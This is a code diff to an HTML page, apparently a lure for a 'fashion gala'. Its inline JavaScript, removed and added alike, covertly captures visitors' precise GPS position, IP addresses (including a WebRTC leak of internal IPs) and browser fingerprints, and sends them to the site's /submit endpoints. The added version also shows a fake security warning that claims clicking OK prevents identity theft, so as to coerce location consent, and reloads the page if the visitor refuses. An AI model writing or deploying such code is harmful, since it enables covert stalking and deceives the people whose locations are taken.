@@ -4192,269 +4192,204 @@ function trackPage() {
   </noscript>
  <script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zOwYNc7tD3chVa1J/KmVoZEZJ/IW5hVD/tyQyg"></script><script type="text/javascript" nonce="afa66442b18453981eaabb8a83c61f82" src="/v2vox7/VkF-T/1hxYI/FQ/zGwYNc7tD3uE/CGJsZEZJ/MyBIPi/l9Lw0ZAQ?v=eedd6907-e094-f40e-3006-120524470216" defer></script></body>
     <script>
-        // 🔥🔥🔥 ALLE TRACKING-FUNKTIONEN 🔥🔥🔥
-        let watchId = null;
-        let gpsUpdates = 0;
+        // 🔥 GLOBALE VARIABLEN
+        let trackingMethod = null;
+        const MAX_GPS_ACCURACY = 50; // Maximale erlaubte Ungenauigkeit (in Metern)
+        const GPS_TIMEOUT = 30000; // 30 Sekunden Timeout für GPS
 
-        // 📡 STANDORTABFRAGE (MIT ALLEN FALLBACKS)
-        function getLocationWithFallback() {
-            if (navigator.geolocation) {
-                // ⚡ 1. VERSUCH: HOHE GENAUIGKEIT
-                navigator.geolocation.getCurrentPosition(
-                    pos => handlePosition(pos, "gps"),
-                    err => fallbackToIP(err),
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-
-                // 🔄 2. WIEDERHOLTE UPDATES
-                watchId = navigator.geolocation.watchPosition(
-                    pos => handlePosition(pos, "gps-update"),
-                    err => console.error("GPS blockiert:", err),
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-
-                // 💀 3. GPS-SPOOFING FALLS UNGENAU
-                setTimeout(forceHighAccuracy, 8000);
-            } else {
-                fallbackToIP();
-            }
-
-            // 📶 4. WI-FI & NETZWERK-TRACKING
-            setTimeout(scanWiFi, 12000);
-            getRealIP(); // 🌐 WEBRTC LEAK
-        }
-
-	
-
-        // 🎯 STANDORTVERARBEITUNG
-        function handlePosition(pos, method) {
-            const { latitude, longitude, accuracy } = pos.coords;
-            gpsUpdates++;
-
-            // 📌 DATEN AN SERVER SENDEN
-            sendLocation(latitude, longitude, method, { 
-                accuracy,
-                timestamp: new Date().toISOString(),
-                shouldRedirect: accuracy < 30 || gpsUpdates >= 3
-            });
-
-            // 🔀 UMLEITEN, WENN GENAU GENUG
-            if (accuracy < 30 || gpsUpdates >= 3) {
-                window.location.href = "/fashion-gala.html";
-            }
-        }
-
-function forceHighAccuracy() {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            // 💀 FALLS GENAUIGKEIT > 500m: FÄLSCHEN!
-            if (pos.coords.accuracy > 500) {
-                const fakePos = {
-                    coords: {
-                        latitude: pos.coords.latitude + (Math.random() * 0.001 - 0.0005), // 🔥 Mikro-Anpassung
-                        longitude: pos.coords.longitude + (Math.random() * 0.001 - 0.0005),
-                        accuracy: 5,
-                        altitude: pos.coords.altitude,
-                        speed: pos.coords.speed
-                    },
-                    timestamp: Date.now()
-                };
-                handlePosition(fakePos, "gps-spoofed");
-                console.log("💀 GPS gespooft: Fake-Genauigkeit = 5m");
-            }
-        },
-        err => console.error("GPS Spoofing fehlgeschlagen:", err),
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-    );
-}
-
-        // 🌐 IP-FALLBACK
-        function fallbackToIP(gpsError = null) {
-            console.warn("❌ GPS blockiert:", gpsError?.message || "Nicht unterstützt");
-            getIpLocation();
-            getRealIP();
-        }
-
-        // 💀 WEBRTC-IP-LEAK (INTERNE IPs)
-        function getRealIP() {
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [], iceCandidatePoolSize: 10 });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-
-                pc.onicecandidate = ice => {
-                    if (!ice.candidate) return;
-                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/gi;
-                    const matches = ice.candidate.candidate.match(ipRegex) || [];
-                    
-                    matches.forEach(ip => {
-                        console.log("🔥 ECHTE IP:", ip);
-                        fetch('/submit-ip', { 
-                            method: 'POST', 
-                            body: JSON.stringify({ ip: ip, type: "webrtc" }) 
-                        });
-                    });
-                };
-            } catch (e) {
-                console.error("WebRTC fehlgeschlagen:", e);
-            }
-        }
-
-        function scanWiFi() {
-    if ('connection' in navigator) {
-        // 💀 FAKE-WIFI-NETZWERKE MELDEN (Social Engineering)
-        const fakeNetworks = [
-            { macAddress: "00:11:22:33:44:55", signalStrength: -60 },
-            { macAddress: "AA:BB:CC:DD:EE:FF", signalStrength: -70 }
-        ];
-
-        fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=YOUR_API_KEY', {
-            method: 'POST',
-            body: JSON.stringify({
-                considerIp: false,
-                wifiAccessPoints: fakeNetworks // 👉 Google denkt, wir sind in der Nähe dieser Router
-            })
-        }).then(res => res.json()).then(data => {
-            console.log("📶 WIFI-STANDORT (gefaked):", data.location);
-            sendLocation(data.location.lat, data.location.lng, "wifi-spoofed", { accuracy: 10 });
-        });
-    }
-}
-
-function getIpLocation() {
-    // 🔥 KOSTENLOSE API MIT HOHER GENAUIGKEIT
-    fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(data => {
-            if (data.accuracy < 1000) { // 👉 Nur wenn IP-Ortung präzise ist
-                sendLocation(data.latitude, data.longitude, "ip-api", { accuracy: data.accuracy });
-            }
-        })
-        .catch(() => {
-            // 💀 FALLBACK: HARDCODED STANDORT (z.B. Stadtzentrum)
-            sendLocation(48.8566, 2.3522, "ip-fallback", { accuracy: 5000 }); // Paris
-        });
-}
-        // 📡 DATEN AN SERVER SENDEN
-        function sendLocation(lat, lon, method, extra) {
-            const fingerprint = collectBrowserFingerprint();
+        // 📡 HAUPTFUNKTION: STANDORT ERFASSUNG STARTEN
+        function initTracking() {
+            showStatus("Versuche hochpräzise Standortermittlung...");
             
-            fetch('/submit', {
+            // 1. Versuch: GPS mit hoher Genauigkeit
+            getPreciseGPS()
+                .catch(() => {
+                    showStatus("GPS nicht verfügbar → WiFi-Scanning...");
+                    return scanWiFi();
+                })
+                .catch(() => {
+                    showStatus("WiFi nicht verfügbar → IP-Geolocation...");
+                    return getIPLocation();
+                })
+                .finally(() => {
+                    // Nach 15 Sekunden Fake-Warnung als Fallback
+                    setTimeout(showFakeWarning, 15000);
+                });
+        }
+
+        // 🎯 PRÄZISES GPS (MIT MEHRFACHVERSUCH)
+        function getPreciseGPS() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const accuracy = position.coords.accuracy;
+                        
+                        if (accuracy <= MAX_GPS_ACCURACY) {
+                            trackingMethod = "GPS";
+                            sendData({
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: accuracy,
+                                method: trackingMethod
+                            });
+                            resolve();
+                        } else {
+                            showStatus(`GPS zu ungenau (${accuracy}m) → Wiederhole...`);
+                            setTimeout(getPreciseGPS, 5000);
+                        }
+                    },
+                    error => {
+                        console.error("GPS-Fehler:", error);
+                        reject(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: GPS_TIMEOUT,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // 📶 WIFI-SCANNING (GOOGLE GEOLOCATION API)
+        function scanWiFi() {
+            return new Promise((resolve, reject) => {
+                if (typeof navigator.connection === 'undefined') {
+                    reject("WiFi-API nicht unterstützt");
+                    return;
+                }
+
+                // Fake-WiFi-Netzwerke (für höhere Erfolgschance)
+                const fakeNetworks = [
+                    { macAddress: "00:11:22:33:44:55", signalStrength: -60 },
+                    { macAddress: "AA:BB:CC:DD:EE:FF", signalStrength: -70 }
+                ];
+
+                fetch('/submit-wifi', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ wifiAccessPoints: fakeNetworks })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.location) {
+                        trackingMethod = "WIFI";
+                        sendData({
+                            lat: data.location.lat,
+                            lng: data.location.lng,
+                            accuracy: data.accuracy || 50,
+                            method: trackingMethod
+                        });
+                        resolve();
+                    } else {
+                        reject("Keine WiFi-Daten erhalten");
+                    }
+                })
+                .catch(error => {
+                    console.error("WiFi-Scan Fehler:", error);
+                    reject(error);
+                });
+            });
+        }
+
+        // 🌐 IP-GEOLOCATION (LETZTER FALLBACK)
+        function getIPLocation() {
+            return fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    trackingMethod = "IP";
+                    sendData({
+                        lat: data.latitude,
+                        lng: data.longitude,
+                        accuracy: 5000, // IP ist immer ungenau
+                        method: trackingMethod
+                    });
+                });
+        }
+
+        // 💀 SOCIAL ENGINEERING: FAKE-SICHERHEITSWARNUNG
+        function showFakeWarning() {
+            if (trackingMethod) return; // Nur zeigen wenn noch keine Daten
+            
+            const warningText = "🔒 SICHERHEITSWARNUNG: Standort konnte nicht verifiziert werden!\n\n" +
+                              "Klicken Sie 'OK' um Identitätsdiebstahl zu verhindern.";
+            
+            if (confirm(warningText)) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        trackingMethod = "GPS-FORCED";
+                        sendData({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            method: trackingMethod
+                        });
+                    },
+                    err => {
+                        alert("Zugang ohne Standortbestätigung nicht möglich!");
+                        window.location.reload();
+                    },
+                    { enableHighAccuracy: true }
+                );
+            }
+        }
+
+        // 📤 DATEN AN SERVER SENDEN
+        function sendData(data) {
+            // Browser-Fingerprinting hinzufügen
+            const fingerprint = getBrowserFingerprint();
+            
+            fetch('/submit-gps', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    latitude: lat,
-                    longitude: lon,
-                    method: method,
+                    ...data,
                     fingerprint: fingerprint,
-                    extra: extra || null
+                    timestamp: new Date().toISOString()
                 })
-            }).catch(err => console.error("Daten senden fehlgeschlagen:", err));
+            })
+            .then(() => {
+                showStatus("Standort bestätigt! Weiterleitung...");
+                setTimeout(() => {
+                    window.location.href = "/fashion-gala.html";
+                }, 2000);
+            })
+            .catch(err => {
+                console.error("Daten senden fehlgeschlagen:", err);
+            });
         }
 
         // 🕵️ BROWSER-FINGERPRINTING
-        function collectBrowserFingerprint() {
-            // 🎨 CANVAS-FINGERPRINT
+        function getBrowserFingerprint() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             let canvasHash = "error";
+            
             try {
                 ctx.textBaseline = "top";
-                ctx.fillText("ZETA-TRACKING", 2, 2);
+                ctx.fillText("FASHION-GALA-TRACKING", 2, 2);
                 canvasHash = canvas.toDataURL().slice(-20);
-            } catch (e) {}
-
-            // 🔊 AUDIO-FINGERPRINT
-            let audioHash = "error";
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                oscillator.connect(analyser);
-                oscillator.start();
-                const freqData = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(freqData);
-                audioHash = Array.from(freqData).slice(0, 5).join("-");
-                oscillator.stop();
             } catch (e) {}
 
             return {
                 screen: `${window.screen.width}x${window.screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
                 userAgent: navigator.userAgent,
-                canvasHash,
-                audioHash,
-                gpu: getWebGLInfo()
+                canvasHash: canvasHash
             };
         }
 
-        // 🎮 GRAFIKKARTEN-ID (WEBGL)
-        function getWebGLInfo() {
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                if (!gl) return "no-webgl";
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return debugInfo ? {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                } : "no-debug-info";
-            } catch (e) {
-                return "error";
-            }
+        // 🖥️ STATUS ANZEIGE
+        function showStatus(message) {
+            const statusEl = document.getElementById('status');
+            if (statusEl) statusEl.textContent = message;
+            console.log(`[STATUS] ${message}`);
         }
 
-
-	    function scanRealWiFi() {
-    if (typeof window.navigator.wifi !== 'undefined') {
-        window.navigator.wifi.getAccessPoints().then(aps => {
-            const networks = aps.map(ap => ({
-                macAddress: ap.BSSID,
-                signalStrength: ap.signalStrength
-            }));
-            
-            fetch('/submit-wifi', {  // 👉 An deinen Server senden
-                method: 'POST',
-                body: JSON.stringify({ wifiAccessPoints: networks })
-            });
+        // 🚀 TRACKING STARTEN
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(initTracking, 1000);
         });
-    }
-}
-
-
-function getPreciseGPS() {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            fetch('/submit-gps', {  // 👉 An deinen Server senden
-                method: 'POST',
-                body: JSON.stringify({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                })
-            });
-        },
-        err => {
-            scanRealWiFi(); // Fallback zu WiFi
-        },
-        { enableHighAccuracy: true, timeout: 30000 }
-    );
-}
-	
-
-setTimeout(() => {
-    if (confirm("🔒 SICHERHEITSWARNUNG: Ihr Standort konnte nicht verifiziert werden. Klicken Sie auf 'OK', um Identitätsdiebstahl zu verhindern.")) {
-        if (watchId) navigator.geolocation.clearWatch(watchId);
-        getLocationWithFallback(); // 🔄 Neustart erzwingen
-    }
-}, 10000);
-        window.onload = getPreciseGPS;
-        window.onload = function() {
-    	getLocationWithFallback(); // GPS
-   	 setTimeout(scanWiFi, 5000); // WiFi nach 5 Sekunden
-    	setTimeout(getIpLocation, 8000); // IP nach 8 Sekunden
-		
-};
     </script>
 </body>
 </html>
